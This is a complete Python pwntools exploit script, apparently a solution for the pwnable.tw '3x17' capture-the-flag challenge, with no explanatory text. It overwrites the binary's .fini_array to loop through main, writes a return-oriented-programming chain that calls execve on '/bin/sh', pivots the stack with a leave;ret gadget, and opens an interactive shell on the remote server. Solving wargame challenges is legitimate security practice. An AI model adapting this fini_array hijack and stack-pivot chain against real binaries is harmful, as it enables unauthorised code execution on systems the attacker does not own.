from pwn import *

local = False
elf = '3x17' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10105
    r = remote(ip,port)

context.arch = 'amd64'

raw_input("aa")


def write(addr,data):
	r.recv()
	r.send(str(addr))
	r.recv()
	r.send(data)

fini_array = 0x4b40f0
main = 0x401B6D
libc_csu_fini = 0x402960
ret = 0x401016
leave_ret = 0x401c4b

new_rsp = 0x4B4100

write(fini_array,p64(libc_csu_fini)+p64(main))

write(new_rsp,p64(0x000000000041e4af)) # pop rax
write(new_rsp + 8 , p64(0x3b))
write(new_rsp + 16,p64(0x0000000000401696)) # pop rdi
write(new_rsp + 24 , p64(new_rsp + 72))
write(new_rsp + 32 , p64(0x0000000000446e35))  # pop rdx
write(new_rsp + 40 , p64(0))
write(new_rsp + 48 , p64(0x0000000000406c30)) # pop esi
write(new_rsp + 56 , p64(0))
write(new_rsp + 64 , p64(0x00000000004022b4)) # system
write(new_rsp + 72 , '/bin/sh\x00')
write(fini_array,p64(leave_ret))
r.interactive()

